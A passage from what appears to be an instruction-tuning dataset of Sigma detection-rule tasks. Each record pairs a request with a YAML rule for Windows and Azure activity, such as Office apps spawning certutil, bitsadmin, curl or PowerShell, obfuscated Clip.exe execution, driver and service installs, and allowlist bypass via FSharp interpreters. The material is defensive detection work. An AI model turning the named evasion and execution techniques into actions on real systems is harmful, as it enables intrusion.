      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName|startswith: \n            - 'MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH'\n            - 'MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH'\n        operationName|endswith:\n            - '/CRONJOBS/WRITE'\n            - '/JOBS/WRITE'\n    condition: selection\nfalsepositives:\n    - Azure Kubernetes CronJob/Job may be done by a system administrator.\n    - If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate.\nKubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs.\nAn Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n",
      "answer": "In order to identify when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster, you should: Monitor Azure activity logs for specific operation names that indicate interaction with Kubernetes connected clusters and managed clusters, particularly those operation names that start with 'MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH' or 'MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH' and end with '/CRONJOBS/WRITE' or '/JOBS/WRITE'. These logs are indicative of activities related to the creation or modification of Kubernetes Jobs and CronJobs, which can be used for legitimate batch processing tasks but might also be utilized by adversaries for malicious purposes. It is essential to consider that some detected activities may be legitimate administrative actions. Hence, known benign behaviors may need to be filtered out to reduce false positives. This approach leverages Azure's logging capabilities to identify potential misuse of Kubernetes CronJobs and Jobs, ensuring that only those activities that deviate from expected patterns are flagged for further investigation. The associated tactics and techniques for this kind of monitoring include Execution and Persistence, as managing and scheduling tasks like CronJobs and Jobs can be abused by attackers to execute malicious code or maintain their presence within a cluster."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of Clip.exe to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of Clip.exe to execute PowerShell, you should focus on monitoring PowerShell script activities within Windows environments. Specifically, attention should be given to the Script Block Logging, which must be enabled to trace potentially malicious PowerShell executions. The key indicator for this type of attack involves looking for patterns in the ScriptBlockText that include the use of `cmd` with either `/c` or `/r` switches in close proximity to `clip.exe` or just `clip` followed by an attempt to interact with the clipboard in a concatenated and obfuscated manner. Such patterns often involve complex strings meant to obscure the intended action, which might include, but are not limited to, sequences that significantly utilize regex patterns to detect the precise formatting of commands designed to leverage Clip.exe for malicious purposes. Tags associated with this kind of activity mainly encompass tactics and techniques related to 'Execution', given the execution of commands via the command line, and 'Defense Evasion', regarding the obfuscated manner in which the Clip.exe utility is being utilized to execute PowerShell scripts indirectly. Detecting such activities is critical and is set at a high level of importance due to the potential for these methods to bypass conventional detection mechanisms and facilitate unauthorized actions on the target system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_4104:\n        ScriptBlockText|re: '.*cmd.{0,5}(?:/c|/r).+clip(?:\\.exe)?.{0,4}&&.+clipboard]::\\(\\s\\\\\"\\{\\d\\}.+-f.+\"'\n    condition: selection_4104\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_4104:\n        ScriptBlockText|re: '.*cmd.{0,5}(?:/c|/r).+clip(?:\\.exe)?.{0,4}&&.+clipboard]::\\(\\s\\\\\"\\{\\d\\}.+-f.+\"'\n    condition: selection_4104\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of Clip.exe to execute PowerShell",
      "answer": "In order to detect obfuscated use of Clip.exe to execute PowerShell, you should focus on monitoring PowerShell script activities within Windows environments. Specifically, attention should be given to the Script Block Logging, which must be enabled to trace potentially malicious PowerShell executions. The key indicator for this type of attack involves looking for patterns in the ScriptBlockText that include the use of `cmd` with either `/c` or `/r` switches in close proximity to `clip.exe` or just `clip` followed by an attempt to interact with the clipboard in a concatenated and obfuscated manner. Such patterns often involve complex strings meant to obscure the intended action, which might include, but are not limited to, sequences that significantly utilize regex patterns to detect the precise formatting of commands designed to leverage Clip.exe for malicious purposes. Tags associated with this kind of activity mainly encompass tactics and techniques related to 'Execution', given the execution of commands via the command line, and 'Defense Evasion', regarding the obfuscated manner in which the Clip.exe utility is being utilized to execute PowerShell scripts indirectly. Detecting such activities is critical and is set at a high level of importance due to the potential for these methods to bypass conventional detection mechanisms and facilitate unauthorized actions on the target system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders.\nBoth services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders, which are associated with the tool Ghost-In-The-Logs and uses KDU, monitored actions should include scanning for `SetValue` events within the Windows Registry, specifically targeting the `ImagePath` attributes of the `HKLM\\System\\CurrentControlSet\\Services\\NalDrv` and `HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152` service keys. These events indicate an attempt to install or modify the path of a service, which can be a tactic used by attackers to execute malicious software.\n\nTo accurately identify malicious activity and reduce false positives, it's important to exclude any events where the `Image` path ends with known system utilities like `procexp64.exe`, `procexp.exe`, `procmon64.exe`, `procmon.exe`, `handle.exe`, or `handle64.exe`. Additionally, the presence of `Details` containing the path `\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS` should be excluded as this might indicate legitimate activity involving these tools. It's crucial to adapt the exclusion list to match the environment by adding full paths of legitimate utility usage to avoid misinterpretation.\n\nHowever, it's important to acknowledge that while this detection mechanism can identify certain malicious activities, it's not foolproof. Attackers can easily bypass this form of detection by renaming the services, indicating a medium level of confidence in this detection strategy. Therefore, reliance solely on this method is not recommended without cross-checking with additional detection mechanisms or behavioral analysis to confirm malicious intent.\n\nThis approach focuses on identifying specific tactics and techniques associated with initial access and execution, as these services being installed to non-standard directories can be indicative of an attacker's attempt to gain persistence or execute malicious payloads outside of typical system scrutiny.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Services\\NalDrv\\ImagePath'\n            - 'HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152\\ImagePath'\n    filter:\n        Image|endswith:\n            # Please add the full paths that you use in your environment to tighten the rule\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\procmon64.exe'\n            - '\\procmon.exe'\n            - '\\handle.exe'\n            - '\\handle64.exe'\n        Details|contains: '\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS'\n    condition: selection and not filter\nfalsepositives:\n    - Other legimate tools using this service names and drivers. Note - clever attackers may easily bypass this detection by just renaming the services. Therefore just Medium-level and don't rely on it.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject:\n            - 'HKLM\\System\\CurrentControlSet\\Services\\NalDrv\\ImagePath'\n            - 'HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152\\ImagePath'\n    filter:\n        Image|endswith:\n            # Please add the full paths that you use in your environment to tighten the rule\n            - '\\procexp64.exe'\n            - '\\procexp.exe'\n            - '\\procmon64.exe'\n            - '\\procmon.exe'\n            - '\\handle.exe'\n            - '\\handle64.exe'\n        Details|contains: '\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS'\n    condition: selection and not filter\nfalsepositives:\n    - Other legimate tools using this service names and drivers. Note - clever attackers may easily bypass this detection by just renaming the services. Therefore just Medium-level and don't rely on it.\nlevel: medium\n",
      "question": "installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders.\nBoth services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)\n",
      "answer": "In order to detect the installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders, which are associated with the tool Ghost-In-The-Logs and uses KDU, monitored actions should include scanning for `SetValue` events within the Windows Registry, specifically targeting the `ImagePath` attributes of the `HKLM\\System\\CurrentControlSet\\Services\\NalDrv` and `HKLM\\System\\CurrentControlSet\\Services\\PROCEXP152` service keys. These events indicate an attempt to install or modify the path of a service, which can be a tactic used by attackers to execute malicious software.\n\nTo accurately identify malicious activity and reduce false positives, it's important to exclude any events where the `Image` path ends with known system utilities like `procexp64.exe`, `procexp.exe`, `procmon64.exe`, `procmon.exe`, `handle.exe`, or `handle64.exe`. Additionally, the presence of `Details` containing the path `\\WINDOWS\\system32\\Drivers\\PROCEXP152.SYS` should be excluded as this might indicate legitimate activity involving these tools. It's crucial to adapt the exclusion list to match the environment by adding full paths of legitimate utility usage to avoid misinterpretation.\n\nHowever, it's important to acknowledge that while this detection mechanism can identify certain malicious activities, it's not foolproof. Attackers can easily bypass this form of detection by renaming the services, indicating a medium level of confidence in this detection strategy. Therefore, reliance solely on this method is not recommended without cross-checking with additional detection mechanisms or behavioral analysis to confirm malicious intent.\n\nThis approach focuses on identifying specific tactics and techniques associated with initial access and execution, as these services being installed to non-standard directories can be indicative of an attacker's attempt to gain persistence or execute malicious payloads outside of typical system scrutiny."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.), you should: Monitor Windows system logs for process creations originating from Microsoft Office applications like EQNEDT32.EXE, EXCEL.EXE, MSACCESS.EXE, MSPUB.exe, ONENOTE.EXE, POWERPNT.exe, VISIO.exe, WINWORD.EXE, wordpad.exe, and wordview.exe. Be especially vigilant for these parent processes spawning known potentially malicious child processes, including but not limited to bitsadmin.exe, CertUtil.exe, Cmd.Exe, PowerShell.EXE, regsvr32.exe, and others that are typically used in offensive security practices. Furthermore, pay particular attention to suspicious child processes executing from unusual paths like AppData, Users\\Public, ProgramData, Windows\\Tasks, Windows\\Temp, and Windows\\System32\\Tasks, as these are common hiding spots for malicious files. The combination of a Microsoft Office product initiating one of these known risky or uncommon child processes, especially from suspicious paths, should be thoroughly investigated for potential security threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\EQNEDT32.EXE'\n            - '\\EXCEL.EXE'\n            - '\\MSACCESS.EXE'\n            - '\\MSPUB.exe'\n            - '\\ONENOTE.EXE'\n            - '\\POWERPNT.exe'\n            - '\\VISIO.exe'\n            - '\\WINWORD.EXE'\n            - '\\wordpad.exe'\n            - '\\wordview.exe'\n    selection_child_processes:\n        - OriginalFileName:\n            - 'bitsadmin.exe'\n            - 'CertOC.exe'\n            - 'CertUtil.exe'\n            - 'Cmd.Exe'\n            - 'CMSTP.EXE'\n            - 'cscript.exe'\n            - 'curl.exe'\n            - 'HH.exe'\n            - 'IEExec.exe'\n            - 'InstallUtil.exe'\n            - 'javaw.exe'\n            - 'Microsoft.Workflow.Compiler.exe'\n            - 'msdt.exe'\n            - 'MSHTA.EXE'\n            - 'msiexec.exe'\n            - 'Msxsl.exe'\n            - 'odbcconf.exe'\n            - 'pcalua.exe'\n            - 'PowerShell.EXE'\n            - 'RegAsm.exe'\n            - 'RegSvcs.exe'\n            - 'REGSVR32.exe'\n            - 'RUNDLL32.exe'\n            - 'schtasks.exe'\n            - 'ScriptRunner.exe'\n            - 'wmic.exe'\n            - 'WorkFolders.exe'\n            - 'wscript.exe'\n        - Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\bitsadmin.exe'\n            - '\\certoc.exe'\n            - '\\certutil.exe'\n            - '\\cmd.exe'\n            - '\\cmstp.exe'\n            - '\\control.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\ieexec.exe'\n            - '\\installutil.exe'\n            - '\\javaw.exe'\n            - '\\mftrace.exe'\n            - '\\Microsoft.Workflow.Compiler.exe'\n            - '\\msbuild.exe'\n            - '\\msdt.exe'\n            - '\\mshta.exe'\n            - '\\msidb.exe'\n            - '\\msiexec.exe'\n            - '\\msxsl.exe'\n            - '\\odbcconf.exe'\n            - '\\pcalua.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regasm.exe'\n            - '\\regsvcs.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'\n            - '\\verclsid.exe'\n            - '\\wmic.exe'\n            - '\\workfolders.exe'\n            - '\\wscript.exe'\n    selection_child_susp_paths: # Idea: Laiali Kazalbach, Mohamed Elsayed (#4142)\n        Image|contains:\n            - '\\AppData\\'\n            - '\\Users\\Public\\'\n            - '\\ProgramData\\'\n            - '\\Windows\\Tasks\\'\n            - '\\Windows\\Temp\\'\n            - '\\Windows\\System32\\Tasks\\'\n    condition: selection_parent and 1 of selection_child_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\EQNEDT32.EXE'\n            - '\\EXCEL.EXE'\n            - '\\MSACCESS.EXE'\n            - '\\MSPUB.exe'\n            - '\\ONENOTE.EXE'\n            - '\\POWERPNT.exe'\n            - '\\VISIO.exe'\n            - '\\WINWORD.EXE'\n            - '\\wordpad.exe'\n            - '\\wordview.exe'\n    selection_child_processes:\n        - OriginalFileName:\n            - 'bitsadmin.exe'\n            - 'CertOC.exe'\n            - 'CertUtil.exe'\n            - 'Cmd.Exe'\n            - 'CMSTP.EXE'\n            - 'cscript.exe'\n            - 'curl.exe'\n            - 'HH.exe'\n            - 'IEExec.exe'\n            - 'InstallUtil.exe'\n            - 'javaw.exe'\n            - 'Microsoft.Workflow.Compiler.exe'\n            - 'msdt.exe'\n            - 'MSHTA.EXE'\n            - 'msiexec.exe'\n            - 'Msxsl.exe'\n            - 'odbcconf.exe'\n            - 'pcalua.exe'\n            - 'PowerShell.EXE'\n            - 'RegAsm.exe'\n            - 'RegSvcs.exe'\n            - 'REGSVR32.exe'\n            - 'RUNDLL32.exe'\n            - 'schtasks.exe'\n            - 'ScriptRunner.exe'\n            - 'wmic.exe'\n            - 'WorkFolders.exe'\n            - 'wscript.exe'\n        - Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\bitsadmin.exe'\n            - '\\certoc.exe'\n            - '\\certutil.exe'\n            - '\\cmd.exe'\n            - '\\cmstp.exe'\n            - '\\control.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\ieexec.exe'\n            - '\\installutil.exe'\n            - '\\javaw.exe'\n            - '\\mftrace.exe'\n            - '\\Microsoft.Workflow.Compiler.exe'\n            - '\\msbuild.exe'\n            - '\\msdt.exe'\n            - '\\mshta.exe'\n            - '\\msidb.exe'\n            - '\\msiexec.exe'\n            - '\\msxsl.exe'\n            - '\\odbcconf.exe'\n            - '\\pcalua.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regasm.exe'\n            - '\\regsvcs.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'\n            - '\\verclsid.exe'\n            - '\\wmic.exe'\n            - '\\workfolders.exe'\n            - '\\wscript.exe'\n    selection_child_susp_paths: # Idea: Laiali Kazalbach, Mohamed Elsayed (#4142)\n        Image|contains:\n            - '\\AppData\\'\n            - '\\Users\\Public\\'\n            - '\\ProgramData\\'\n            - '\\Windows\\Tasks\\'\n            - '\\Windows\\Temp\\'\n            - '\\Windows\\System32\\Tasks\\'\n    condition: selection_parent and 1 of selection_child_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)",
      "answer": "In order to detect a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.), you should: Monitor Windows system logs for process creations originating from Microsoft Office applications like EQNEDT32.EXE, EXCEL.EXE, MSACCESS.EXE, MSPUB.exe, ONENOTE.EXE, POWERPNT.exe, VISIO.exe, WINWORD.EXE, wordpad.exe, and wordview.exe. Be especially vigilant for these parent processes spawning known potentially malicious child processes, including but not limited to bitsadmin.exe, CertUtil.exe, Cmd.Exe, PowerShell.EXE, regsvr32.exe, and others that are typically used in offensive security practices. Furthermore, pay particular attention to suspicious child processes executing from unusual paths like AppData, Users\\Public, ProgramData, Windows\\Tasks, Windows\\Temp, and Windows\\System32\\Tasks, as these are common hiding spots for malicious files. The combination of a Microsoft Office product initiating one of these known risky or uncommon child processes, especially from suspicious paths, should be thoroughly investigated for potential security threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting stopping of a Windows service.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the stopping of a Windows service, you should focus on monitoring the creation of processes within Windows environments. Specifically, pay attention to instances where the process being initiated is either 'net.exe' or 'net1.exe'. These executables are commonly used in Windows for network-related tasks, including the control of services. Detection should be based on two main criteria:\n\n1. The original file name being exactly 'net.exe' or 'net1.exe'. Additionally, be vigilant for processes where the image path ends with '\\net.exe' or '\\net1.exe'. This ensures the detection of these executables irrespective of their location in the file system.\n\n2. The presence of the 'stop' command within the command line used to initiate the process. This is indicative of an attempt to stop a service using the net utility.\n\nBoth of these detection vectors need to be met for an alert to be considered valid. However, it's important to note that there are numerous legitimate reasons for stopping a service in a Windows environment. Due to this, the level of suspicion for this activity is rated as low, and there might be a substantial number of false positives. It\u2019s crucial for security analysts to filter these alerts through the lens of their specific environment's normal operations to discern between benign and potentially malicious activity effectively. This monitoring strategy aligns with understanding tactics and techniques associated with adversarial manipulation of services, though the intent can vary widely, from benign administrative tasks to potentially malicious actions such as disrupting security services.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behaviour in particular. Filter legitimate activity accordingly\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName:\n            - 'net.exe'\n            - 'net1.exe'\n        - Image|endswith:\n            - '\\net.exe'\n            - '\\net1.exe'\n    selection_cli:\n        CommandLine|contains: ' stop '\n    condition: all of selection_*\nfalsepositives:\n    - There are many legitimate reasons to stop a service. This rule isn't looking for any suspicious behaviour in particular. Filter legitimate activity accordingly\nlevel: low\n",
      "question": "stopping of a Windows service",
      "answer": "In order to detect the stopping of a Windows service, you should focus on monitoring the creation of processes within Windows environments. Specifically, pay attention to instances where the process being initiated is either 'net.exe' or 'net1.exe'. These executables are commonly used in Windows for network-related tasks, including the control of services. Detection should be based on two main criteria:\n\n1. The original file name being exactly 'net.exe' or 'net1.exe'. Additionally, be vigilant for processes where the image path ends with '\\net.exe' or '\\net1.exe'. This ensures the detection of these executables irrespective of their location in the file system.\n\n2. The presence of the 'stop' command within the command line used to initiate the process. This is indicative of an attempt to stop a service using the net utility.\n\nBoth of these detection vectors need to be met for an alert to be considered valid. However, it's important to note that there are numerous legitimate reasons for stopping a service in a Windows environment. Due to this, the level of suspicion for this activity is rated as low, and there might be a substantial number of false positives. It\u2019s crucial for security analysts to filter these alerts through the lens of their specific environment's normal operations to discern between benign and potentially malicious activity effectively. This monitoring strategy aligns with understanding tactics and techniques associated with adversarial manipulation of services, though the intent can vary widely, from benign administrative tasks to potentially malicious actions such as disrupting security services."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of the LiveKD driver, which is used for live kernel debugging.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of the LiveKD driver, which is used for live kernel debugging, you should: Focus on monitoring file events in Windows environments, specifically watching for the creation of a file named \"C:\\Windows\\System32\\drivers\\LiveKdD.SYS.\" Additionally, the execution of processes that end with '\\livekd.exe' or '\\livek64.exe' should be tracked. This is crucial because such activities are indicators of the use of LiveKD, a tool designed for live kernel debugging. Be aware that genuine debugging efforts using LiveKD will also match these criteria, therefore, such legitimate usage should be considered as potential false positives. This monitoring is categorized under a medium severity level due to its potential implications for live kernel debugging activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename: 'C:\\Windows\\System32\\drivers\\LiveKdD.SYS'\n        Image|endswith:\n            - '\\livekd.exe'\n            - '\\livek64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of LiveKD for debugging purposes will also trigger this\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename: 'C:\\Windows\\System32\\drivers\\LiveKdD.SYS'\n        Image|endswith:\n            - '\\livekd.exe'\n            - '\\livek64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of LiveKD for debugging purposes will also trigger this\nlevel: medium\n",
      "question": "creation of the LiveKD driver, which is used for live kernel debugging",
      "answer": "In order to detect the creation of the LiveKD driver, which is used for live kernel debugging, you should: Focus on monitoring file events in Windows environments, specifically watching for the creation of a file named \"C:\\Windows\\System32\\drivers\\LiveKdD.SYS.\" Additionally, the execution of processes that end with '\\livekd.exe' or '\\livek64.exe' should be tracked. This is crucial because such activities are indicators of the use of LiveKD, a tool designed for live kernel debugging. Be aware that genuine debugging efforts using LiveKD will also match these criteria, therefore, such legitimate usage should be considered as potential false positives. This monitoring is categorized under a medium severity level due to its potential implications for live kernel debugging activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting The FSharp Interpreters, FsiAnyCpu.exe and FSi.exe, can be used for AWL bypass and is listed in Microsoft recommended block rules..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the utilization of FSharp Interpreters (FsiAnyCpu.exe and FSi.exe) for AWL (Application Allowlisting) bypass, which is highlighted in Microsoft's recommended block rules, you should monitor for the creation of processes on Windows systems that are linked to these interpreters. This involves looking for instances where either 'fsianycpu.exe' or 'fsi.exe' are executed, indicated by the end portion of the process image path or the original file name used during process creation. Regarding considerations to avoid false positives, it's important to note that the legitimate use of these interpreters by software developers can occur; therefore, such instances should be carefully assessed. The severity level associated with detecting this activity is classified as medium, emphasizing the necessity for attention while also considering possible legitimate use cases. This strategy is aimed at identifying potential misuse of these interpreters which could circumvent application allowlisting defenses, a tactic attackers might use to execute unauthorized code on a system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\fsianycpu.exe'\n        - OriginalFileName: 'fsianycpu.exe'\n        - Image|endswith: '\\fsi.exe'\n        - OriginalFileName: 'fsi.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by a software developer.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\fsianycpu.exe'\n        - OriginalFileName: 'fsianycpu.exe'\n        - Image|endswith: '\\fsi.exe'\n        - OriginalFileName: 'fsi.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use by a software developer.\nlevel: medium\n",
      "question": "The FSharp Interpreters, FsiAnyCpu.exe and FSi.exe, can be used for AWL bypass and is listed in Microsoft recommended block rules.",
      "answer": "In order to detect the utilization of FSharp Interpreters (FsiAnyCpu.exe and FSi.exe) for AWL (Application Allowlisting) bypass, which is highlighted in Microsoft's recommended block rules, you should monitor for the creation of processes on Windows systems that are linked to these interpreters. This involves looking for instances where either 'fsianycpu.exe' or 'fsi.exe' are executed, indicated by the end portion of the process image path or the original file name used during process creation. Regarding considerations to avoid false positives, it's important to note that the legitimate use of these interpreters by software developers can occur; therefore, such instances should be carefully assessed. The severity level associated with detecting this activity is classified as medium, emphasizing the necessity for attention while also considering possible legitimate use cases. This strategy is aimed at identifying potential misuse of these interpreters which could circumvent application allowlisting defenses, a tactic attackers might use to execute unauthorized code on a system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a new service using the \"sc.exe\" utility..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a new service using the \"sc.exe\" utility, you should: Monitor the process creation logs on Windows systems for any instances where the executable path ends with '\\sc.exe', and the command line includes both 'create' and 'binPath'. This activity might indicate an attempt to establish persistence or manage services in a malicious manner, as \"sc.exe\" is a legitimate Windows command-line tool used for managing Windows services, including creating new ones. However, be aware that there might be false positives, such as when a legitimate administrator or user creates a service for a valid reason or during software installation. Given these considerations, the detection sensitivity is set to low to minimize the chance of flagging legitimate activities as suspicious.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binPath'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'create'\n            - 'binPath'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low\n",
      "question": "creation of a new service using the \"sc.exe\" utility.",
      "answer": "In order to detect the creation of a new service using the \"sc.exe\" utility, you should: Monitor the process creation logs on Windows systems for any instances where the executable path ends with '\\sc.exe', and the command line includes both 'create' and 'binPath'. This activity might indicate an attempt to establish persistence or manage services in a malicious manner, as \"sc.exe\" is a legitimate Windows command-line tool used for managing Windows services, including creating new ones. However, be aware that there might be false positives, such as when a legitimate administrator or user creates a service for a valid reason or during software installation. Given these considerations, the detection sensitivity is set to low to minimize the chance of flagging legitimate activities as suspicious."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect remote PowerShell sessions by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session), you should monitor Windows process creation logs for entries where the process image or its parent image ends with '\\wsmprovhost.exe'. It's essential to pay attention to the computer name, user, and command line used in the creation of these processes. However, be aware that there may be false positives, such as the legitimate usage of remote PowerShell, for instance, for monitoring purposes. This monitoring has a medium importance level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\wsmprovhost.exe'\n        - ParentImage|endswith: '\\wsmprovhost.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate usage of remote Powershell, e.g. for monitoring purposes.\nlevel: medium\n",
      "question": "remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).",
